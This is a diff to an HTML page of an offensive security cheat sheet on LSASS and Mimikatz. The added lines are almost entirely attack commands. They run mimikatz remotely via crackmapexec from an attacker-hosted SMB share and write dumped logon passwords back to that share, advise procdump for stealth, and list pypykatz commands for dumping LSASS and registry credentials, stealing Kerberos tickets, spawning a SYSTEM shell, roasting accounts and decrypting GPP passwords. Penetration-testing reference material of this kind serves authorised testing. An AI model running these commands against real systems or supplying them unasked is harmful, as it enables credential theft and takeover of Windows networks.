@@ -5,7 +5,7 @@
     
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
-<meta name="revised" content="2019-11-01T16:53:26 CET">
+<meta name="revised" content="2019-11-10T13:28:52 CET">
 <title>LSASS and Mimikatz :: Offensive Security Cheatsheet</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
@@ -1021,6 +1021,13 @@
           </a><i class="fa fa-circle-thin read-icon"></i>
         </div>
     </li>
+      <li data-nav-id="/windows-systems/privilege-escalation/privexchange/" class="dd-item">
+        <div>
+          <a href="/windows-systems/privilege-escalation/privexchange/">
+            PrivExchange
+          </a><i class="fa fa-circle-thin read-icon"></i>
+        </div>
+    </li>
         </ul>
     </li>
     <li data-nav-id="/windows-systems/post-exploitation-techniques/" class="dd-item haschildren
@@ -1351,6 +1358,7 @@
       <option value="/windows-systems/privilege-escalation/lsass_mimikatz/"  selected>-- LSASS and Mimikatz</option>
       <option value="/windows-systems/privilege-escalation/tricks/" >-- Tricks</option>
       <option value="/windows-systems/privilege-escalation/windows_defender/" >-- Windows Defender</option>
+      <option value="/windows-systems/privilege-escalation/privexchange/" >-- PrivExchange</option>
   
     <option value="/windows-systems/post-exploitation-techniques/" >
   - 
@@ -1420,7 +1428,53 @@ winexe -U admin%password //IP C:<span style="color:#8045ff">\\</span>Windows<spa
 
 <span style="color:#75715e"># Password dumping</span>
 mimikatz <span style="color:#75715e"># privilege::debug</span>
-mimikatz <span style="color:#75715e"># sekurlsa::logonPasswords /full</span></code></pre></div>
+mimikatz <span style="color:#75715e"># sekurlsa::logonPasswords /full</span></code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># In case of Mimikatz is trigerred on the target machine, you can try bring it up using network share</span>
+sudo python smbserver.py SHARE /home/xxxxx/share_path/
+
+sudo ./venv/bin/crackmapexec smb IP -u <span style="color:#d88200">&#34;xxx&#34;</span> -p <span style="color:#d88200">&#34;xxx&#34;</span> -X <span style="color:#d88200">&#39;\\share_ip\SHARE\mimikatz.exe &#34;privilege::debug&#34; &#34;sekurlsa::logonPasswords /full&#34; exit &gt; \\share_ip\SHARE\mimiout_$env:computername.txt&#39;</span>
+
+<span style="color:#75715e"># In order to be stealthier, you can even do the same for procdump</span>
+sudo ./venv/bin/crackmapexec smb IP -u <span style="color:#d88200">&#34;xxx&#34;</span> -p <span style="color:#d88200">&#34;xxx&#34;</span> -X <span style="color:#d88200">&#39;\\share_ip\SHARE\procdump.exe &#34;TODO&#34;&#39;</span></code></pre></div>
+<p><br/></p>
+
+<h3 id="pypykatz">Pypykatz</h3>
+<div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">https://github.com/skelsec/pypykatz
+
+<span style="color:#75715e"># Mimikatz implementation in pure Python. At least a part of it :)</span>
+<span style="color:#75715e"># In case of mimikatz is trigerred by the target AV</span>
+<span style="color:#75715e"># Cross platform (only need python3.6)</span>
+
+<span style="color:#75715e"># Live commands need to be ran on live systems</span>
+<span style="color:#75715e"># Others commands can be used for other purposes</span></code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Get LSASS credentials (+ Kerberos tickets)</span>
+pypykatz live lsa
+pypykatz live lsa -o &lt;output_dir&gt; -k &lt;kerberos_dir&gt;
+
+<span style="color:#75715e"># List users prone to SPNRoast and ASRepRoast</span>
+pypykatz live ldap spn
+pypykatz live ldap asrep
+
+<span style="color:#75715e"># Print all tokens</span>
+pypykatz live token list
+
+<span style="color:#75715e"># Spawn a SYSTEM shell</span>
+pypykatz live process create
+
+<span style="color:#75715e"># Print registry credentials</span>
+pypykatz live registry
+
+<span style="color:#75715e"># List all users ever logged on the target</span>
+pypykatz live users list
+
+<span style="color:#75715e"># Gives back the current user in domain:username:SID format</span>
+pypykatz live users whoami</code></pre></div><div class="highlight"><pre style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Parsr mimidump file</span>
+pypykatz lsa minidump &lt;input_file&gt;
+
+<span style="color:#75715e"># List domain users prone to SPNRoast or ASRepRoast</span>
+pypykatz ldap TEST/victim/pw:@10.10.10.2 spn
+pypykatz ldap TEST/victim/pw:@10.10.10.2 asrep
+
+<span style="color:#75715e"># Decrypt gpp-pass</span>
+pypykatz gppass &lt;base64_enc_password&gt;</code></pre></div>
 
     
     
